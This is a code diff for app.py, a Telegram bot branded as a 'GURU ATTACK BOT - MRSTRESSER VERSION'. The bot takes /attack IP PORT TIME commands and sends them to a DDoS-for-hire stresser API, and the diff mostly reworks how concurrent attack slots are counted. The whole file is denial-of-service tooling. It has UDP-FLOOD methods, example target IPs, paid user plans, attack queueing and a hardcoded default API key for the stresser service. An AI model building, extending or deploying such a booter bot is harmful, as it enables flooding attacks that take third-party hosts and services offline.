@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED VERSION - NON-BLOCKING
+# app.py - COMPLETE FIXED WITH PROPER CONCURRENT
 import os
 import logging
 import asyncio
@@ -34,9 +34,10 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 
-# CONCURRENT SETTINGS
-MAX_CONCURRENT_PER_USER = 2  # Each attack uses 2 concurrent
-MAX_TOTAL_CONCURRENT = 8     # Total 8 concurrent (4 attacks max)
+# CONCURRENT SETTINGS - FIXED
+CONCURRENT_PER_ATTACK = 4  # Each attack uses 4 concurrent slots
+MAX_CONCURRENT_PER_USER = 8  # Each user can have up to 8 concurrent (2 attacks × 4)
+MAX_TOTAL_CONCURRENT = 8  # Total 8 concurrent
 MIN_DURATION = 60
 MAX_DURATION = 300
 
@@ -608,7 +609,7 @@ class Database:
             self.settings["pause_all"] = paused
             return False
     
-    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=2):
+    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=4):
         try:
             log = {
                 "user_id": user_id,
@@ -691,7 +692,7 @@ def init_pseudo_owner():
 init_owner()
 init_pseudo_owner()
 
-# ===== ATTACK MANAGER =====
+# ===== ATTACK MANAGER - FIXED CONCURRENT =====
 class AttackManager:
     def __init__(self):
         self.active_attacks = {}
@@ -702,25 +703,28 @@ class AttackManager:
         self.user_active_attacks = {}
         self.attack_queue = []
         self.processing_queue = False
-        
-        # Track background tasks
         self.background_tasks = set()
     
     def get_max_concurrent_for_user(self, user_id):
         if db.is_owner_or_pseudo(user_id):
-            return MAX_TOTAL_CONCURRENT
-        return MAX_CONCURRENT_PER_USER
+            return MAX_TOTAL_CONCURRENT  # Owners get full 8
+        return MAX_CONCURRENT_PER_USER  # Regular users get 8 (2 attacks × 4 concurrent)
     
     def can_start_attack(self, user_id):
         with self.lock:
-            if self.concurrent_busy >= MAX_TOTAL_CONCURRENT:
-                return False, f"❌ All concurrent slots are full ({self.concurrent_busy}/{MAX_TOTAL_CONCURRENT})"
+            # Check total concurrent limit
+            if self.concurrent_busy + CONCURRENT_PER_ATTACK > MAX_TOTAL_CONCURRENT:
+                return False, f"❌ Not enough concurrent slots available.\nNeed {CONCURRENT_PER_ATTACK} slots, only {MAX_TOTAL_CONCURRENT - self.concurrent_busy} available."
             
             max_per_user = self.get_max_concurrent_for_user(user_id)
             user_attacks = self.user_active_attacks.get(user_id, 0)
             
-            if user_attacks >= max_per_user:
-                return False, f"❌ You have reached your limit ({user_attacks}/{max_per_user})"
+            # Each attack uses CONCURRENT_PER_ATTACK slots
+            if user_attacks + CONCURRENT_PER_ATTACK > max_per_user:
+                if db.is_owner_or_pseudo(user_id):
+                    return False, f"❌ You have reached maximum concurrent ({user_attacks}/{MAX_TOTAL_CONCURRENT})"
+                else:
+                    return False, f"❌ You have reached your limit ({user_attacks}/{MAX_CONCURRENT_PER_USER})"
             
             return True, "OK"
     
@@ -729,9 +733,10 @@ class AttackManager:
             self.attack_counter += 1
             attack_id = self.attack_counter
             self.total_attacks += 1
-            self.concurrent_busy += 1
             
-            self.user_active_attacks[user_id] = self.user_active_attacks.get(user_id, 0) + 1
+            # Each attack uses CONCURRENT_PER_ATTACK slots
+            self.concurrent_busy += CONCURRENT_PER_ATTACK
+            self.user_active_attacks[user_id] = self.user_active_attacks.get(user_id, 0) + CONCURRENT_PER_ATTACK
             
             self.active_attacks[attack_id] = {
                 'id': attack_id,
@@ -742,7 +747,8 @@ class AttackManager:
                 'method': method,
                 'start_time': datetime.now(),
                 'status': 'running',
-                'end_time': datetime.now() + timedelta(seconds=duration)
+                'end_time': datetime.now() + timedelta(seconds=duration),
+                'concurrent_used': CONCURRENT_PER_ATTACK
             }
             
             # Schedule cleanup after duration
@@ -758,11 +764,12 @@ class AttackManager:
         with self.lock:
             if attack_id in self.active_attacks:
                 user_id = self.active_attacks[attack_id]['user_id']
+                concurrent_used = self.active_attacks[attack_id].get('concurrent_used', CONCURRENT_PER_ATTACK)
                 self.active_attacks[attack_id]['status'] = 'stopped'
-                self.concurrent_busy = max(0, self.concurrent_busy - 1)
+                self.concurrent_busy = max(0, self.concurrent_busy - concurrent_used)
                 
                 if user_id in self.user_active_attacks:
-                    self.user_active_attacks[user_id] = max(0, self.user_active_attacks[user_id] - 1)
+                    self.user_active_attacks[user_id] = max(0, self.user_active_attacks[user_id] - concurrent_used)
                     if self.user_active_attacks[user_id] == 0:
                         del self.user_active_attacks[user_id]
                 
@@ -774,11 +781,12 @@ class AttackManager:
         with self.lock:
             if attack_id in self.active_attacks:
                 user_id = self.active_attacks[attack_id]['user_id']
+                concurrent_used = self.active_attacks[attack_id].get('concurrent_used', CONCURRENT_PER_ATTACK)
                 self.active_attacks[attack_id]['status'] = 'stopped'
-                self.concurrent_busy = max(0, self.concurrent_busy - 1)
+                self.concurrent_busy = max(0, self.concurrent_busy - concurrent_used)
                 
                 if user_id in self.user_active_attacks:
-                    self.user_active_attacks[user_id] = max(0, self.user_active_attacks[user_id] - 1)
+                    self.user_active_attacks[user_id] = max(0, self.user_active_attacks[user_id] - concurrent_used)
                     if self.user_active_attacks[user_id] == 0:
                         del self.user_active_attacks[user_id]
                 
@@ -796,8 +804,10 @@ class AttackManager:
                 'total': self.total_attacks,
                 'max_total': MAX_TOTAL_CONCURRENT,
                 'max_per_user': MAX_CONCURRENT_PER_USER,
+                'concurrent_per_attack': CONCURRENT_PER_ATTACK,
                 'user_attacks': dict(self.user_active_attacks),
-                'queue_size': len(self.attack_queue)
+                'queue_size': len(self.attack_queue),
+                'active_attacks': self.active_attacks
             }
     
     def add_to_queue(self, user_id, target, port, duration, method, context):
@@ -843,7 +853,7 @@ class AttackManager:
                     attack_data['method']
                 )
                 
-                # Start attack in background - don't wait
+                # Send actual API request in background
                 task = asyncio.create_task(self.execute_attack(
                     attack_id,
                     attack_data['target'],
@@ -856,7 +866,6 @@ class AttackManager:
                 self.background_tasks.add(task)
                 task.add_done_callback(self.background_tasks.discard)
                 
-                # Send confirmation immediately
                 await attack_data['context'].bot.send_message(
                     chat_id=user_id,
                     text=f"✅ *ATTACK SENT!*\n\n"
@@ -864,6 +873,7 @@ class AttackManager:
                          f"⏱️ Duration: `{attack_data['duration']}s`\n"
                          f"📡 Method: `{attack_data['method']}`\n"
                          f"🔄 Concurrent: `{self.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`\n"
+                         f"⚡ This attack uses {CONCURRENT_PER_ATTACK} concurrent slots\n"
                          f"📊 Status: Attack running in background",
                     parse_mode='Markdown'
                 )
@@ -875,12 +885,14 @@ class AttackManager:
     
     async def execute_attack(self, attack_id, target, port, duration, user_id, context, method):
         try:
+            # Send the actual API request (non-blocking)
             result = await send_api_attack_background(target, port, duration, user_id, context, method)
             
             if result and result.get('success'):
                 attack_info = db.log_attack(
                     user_id, target, port, duration, method,
-                    "success", str(result)
+                    "success", str(result),
+                    CONCURRENT_PER_ATTACK
                 )
                 await send_attack_alert(attack_info)
             
@@ -925,9 +937,9 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== API ATTACK - BACKGROUND NON-BLOCKING =====
+# ===== API ATTACK - BACKGROUND =====
 async def send_api_attack_background(target, port, duration, user_id, context, method="UDP-FLOOD"):
-    """Send attack to API - DOES NOT BLOCK THE BOT"""
+    """Send attack to API - NON-BLOCKING"""
     api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
     api_url = os.getenv("API_URL", "https://mrstresser.com/api")
     
@@ -1070,7 +1082,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         concurrent_info = f"{MAX_TOTAL_CONCURRENT} (Full access - Owner)"
     else:
         max_concurrent = MAX_CONCURRENT_PER_USER
-        concurrent_info = f"{MAX_CONCURRENT_PER_USER} (Per user)"
+        concurrent_info = f"{MAX_CONCURRENT_PER_USER} (2 attacks × {CONCURRENT_PER_ATTACK} concurrent)"
     
     welcome_msg = (
         f"👋 *WELCOME TO GURU*\n\n"
@@ -1078,6 +1090,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Total Attacks: {total_attacks}\n"
         f"📊 Plan: {plan_display}\n"
         f"⚡ Max Concurrent: {MAX_TOTAL_CONCURRENT} total\n"
+        f"⚡ Per Attack: {CONCURRENT_PER_ATTACK} concurrent\n"
         f"👤 Your Concurrent: {concurrent_info}\n"
         f"📊 Active Attacks: {user_attacks}/{max_concurrent}\n"
         f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
@@ -1137,9 +1150,10 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
             f"Example: `/attack 91.108.17.41 32001 60 UDP-FLOOD`\n"
             f"Default method: UDP-FLOOD\n\n"
+            f"⚡ Each attack uses {CONCURRENT_PER_ATTACK} concurrent\n"
             f"⚡ Total Concurrent: {MAX_TOTAL_CONCURRENT}\n"
-            f"👤 Users: {MAX_CONCURRENT_PER_USER}x concurrent each\n"
-            f"👑 Owners: {MAX_TOTAL_CONCURRENT}x concurrent\n"
+            f"👤 Users: {MAX_CONCURRENT_PER_USER} concurrent max (2 attacks)\n"
+            f"👑 Owners: {MAX_TOTAL_CONCURRENT} concurrent\n"
             f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds",
             parse_mode='Markdown'
         )
@@ -1160,7 +1174,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         can_start, msg = attack_manager.can_start_attack(user_id)
         if not can_start:
-            if "concurrent slots are full" in msg or "reached your limit" in msg:
+            if "Not enough concurrent slots" in msg or "reached your limit" in msg:
                 attack_manager.add_to_queue(user_id, target, port, duration, method, context)
                 await update.message.reply_text(
                     f"⏳ *Added to Queue*\n\n{msg}\n\n💡 Your attack will start when resources are available.",
@@ -1188,6 +1202,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⏱️ Duration: `{duration}s`\n"
             f"📡 Method: `{method}`\n"
             f"🔄 Concurrent: `{attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`\n"
+            f"⚡ This attack uses {CONCURRENT_PER_ATTACK} concurrent slots\n"
             f"📊 Status: Attack running in background\n\n"
             f"💡 You can start another attack immediately!",
             parse_mode='Markdown'
@@ -1236,6 +1251,7 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await query.edit_message_text(
         f"💥 *SELECT ATTACK METHOD*\n\n"
+        f"⚡ Each attack uses {CONCURRENT_PER_ATTACK} concurrent slots\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
         f"⚡ Total: {stats['concurrent_busy']}/{MAX_TOTAL_CONCURRENT}\n"
         f"👤 Your Active: {user_attacks}/{max_concurrent}\n\n"
@@ -1257,6 +1273,7 @@ async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📡 *Method Selected: {method}*\n\n"
         f"Send: `IP PORT TIME`\n"
         f"Example: `91.108.17.41 32001 60`\n\n"
+        f"⚡ Each attack uses {CONCURRENT_PER_ATTACK} concurrent slots\n"
         f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
         f"Send /cancel to cancel",
         parse_mode='Markdown'
@@ -1313,7 +1330,7 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         can_start, msg = attack_manager.can_start_attack(user_id)
         if not can_start:
-            if "concurrent slots are full" in msg or "reached your limit" in msg:
+            if "Not enough concurrent slots" in msg or "reached your limit" in msg:
                 attack_manager.add_to_queue(user_id, target, port, duration, method, context)
                 await update.message.reply_text(
                     f"⏳ *Added to Queue*\n\n{msg}\n\n💡 Your attack will start when resources are available.",
@@ -1343,6 +1360,7 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⏱️ Duration: `{duration}s`\n"
             f"📡 Method: `{method}`\n"
             f"🔄 Concurrent: `{attack_manager.concurrent_busy}/{MAX_TOTAL_CONCURRENT}`\n"
+            f"⚡ This attack uses {CONCURRENT_PER_ATTACK} concurrent slots\n"
             f"📊 Status: Attack running in background\n\n"
             f"💡 You can start another attack immediately!",
             parse_mode='Markdown'
@@ -1374,6 +1392,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "👑 *OWNER ACCESS*\n\n"
                 "📊 Plan: 💎 PREMIUM (Owner)\n"
                 f"⚡ {MAX_TOTAL_CONCURRENT}x Concurrent (Full Access)\n"
+                f"⚡ {CONCURRENT_PER_ATTACK} concurrent per attack\n"
                 f"📡 {len(ATTACK_METHODS)} Attack Methods\n"
                 "⏱️ Unlimited Attacks"
             )
@@ -1385,8 +1404,9 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"⏱️ Remaining: {days_left} days\n"
                 f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                 "📌 Features:\n"
-                f"• {MAX_CONCURRENT_PER_USER}x Concurrent attacks\n"
-                f"• {MAX_TOTAL_CONCURRENT} total concurrent\n"
+                f"• {CONCURRENT_PER_ATTACK} concurrent per attack\n"
+                f"• {MAX_CONCURRENT_PER_USER} total concurrent (2 attacks)\n"
+                f"• {MAX_TOTAL_CONCURRENT} total system concurrent\n"
                 f"• {len(ATTACK_METHODS)} attack methods"
             )
         else:
@@ -1395,8 +1415,9 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "📊 Plan: 💎 PREMIUM\n"
                 "⏱️ Status: LIFETIME\n\n"
                 "📌 Features:\n"
-                f"• {MAX_CONCURRENT_PER_USER}x Concurrent attacks\n"
-                f"• {MAX_TOTAL_CONCURRENT} total concurrent\n"
+                f"• {CONCURRENT_PER_ATTACK} concurrent per attack\n"
+                f"• {MAX_CONCURRENT_PER_USER} total concurrent (2 attacks)\n"
+                f"• {MAX_TOTAL_CONCURRENT} total system concurrent\n"
                 f"• {len(ATTACK_METHODS)} attack methods"
             )
     
@@ -1431,6 +1452,7 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👑 Admins: {len(admins)}\n"
         f"💥 Attacks: {total_attacks}\n"
         f"⚡ Active: {stats['concurrent_busy']}/{stats['max_total']}\n"
+        f"⚡ Per Attack: {stats['concurrent_per_attack']} concurrent\n"
         f"⏳ Queue: {stats['queue_size']}\n"
         f"📡 Methods: {len(ATTACK_METHODS)}",
         parse_mode='Markdown',
@@ -1662,7 +1684,7 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     
     await query.edit_message_text(
-        f"👑 OWNER PANEL\n\nStatus: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n⚡ Full {MAX_TOTAL_CONCURRENT}x Concurrent Access",
+        f"👑 OWNER PANEL\n\nStatus: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n⚡ Full {MAX_TOTAL_CONCURRENT}x Concurrent Access\n⚡ {CONCURRENT_PER_ATTACK} concurrent per attack",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
@@ -1933,6 +1955,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"📊 *BOT STATUS*\n\n"
         f"⚡ Active: {stats['concurrent_busy']}/{stats['max_total']}\n"
+        f"⚡ Per Attack: {stats['concurrent_per_attack']} concurrent\n"
         f"👥 Users: {len(users)}\n"
         f"⏳ Queue: {stats['queue_size']}\n"
         f"📡 Methods: {len(ATTACK_METHODS)}\n"
@@ -2037,8 +2060,9 @@ if __name__ == "__main__":
     print("=" * 50)
     print("👑 GURU ATTACK BOT - MRSTRESSER VERSION")
     print(f"⚡ TOTAL CONCURRENT: {MAX_TOTAL_CONCURRENT}")
-    print(f"👤 PER USER: {MAX_CONCURRENT_PER_USER}x concurrent")
-    print(f"👑 OWNERS: Full {MAX_TOTAL_CONCURRENT}x concurrent")
+    print(f"⚡ PER ATTACK: {CONCURRENT_PER_ATTACK} concurrent")
+    print(f"👤 USERS: {MAX_CONCURRENT_PER_USER} max (2 attacks)")
+    print(f"👑 OWNERS: Full {MAX_TOTAL_CONCURRENT} concurrent")
     print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
     print(f"📡 Methods: {len(ATTACK_METHODS)} methods")
     print("=" * 50)
